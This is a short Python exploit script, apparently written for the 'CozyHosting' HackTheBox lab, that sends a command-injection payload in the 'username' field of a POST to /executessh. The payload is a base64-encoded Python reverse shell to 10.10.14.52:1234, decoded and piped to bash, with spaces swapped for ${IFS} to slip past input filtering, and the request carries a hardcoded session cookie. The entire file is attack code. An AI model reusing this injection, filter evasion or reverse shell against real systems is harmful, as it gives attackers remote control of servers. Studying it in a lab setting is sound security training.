import base64
import requests

TARGET = "http://cozyhosting.htb"
ATTACKER_IP = "10.10.14.52"
ATTACKER_PORT = 1234

# Python reverse shell worked
COMMAND = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
payload = f"echo {base64.b64encode(COMMAND.encode()).decode()}|base64 -d|bash"

# Escape spaces because they are not allowed
payload = payload.replace(" ", "${IFS}")
print(payload)
res = requests.post(TARGET + "/executessh",
                    data={"username": f"a;{payload}|", "host":"localhost"},
                    cookies={"JSESSIONID": "DE7A82800A140F29E4EF11F2B548667B"},
                    allow_redirects=False)
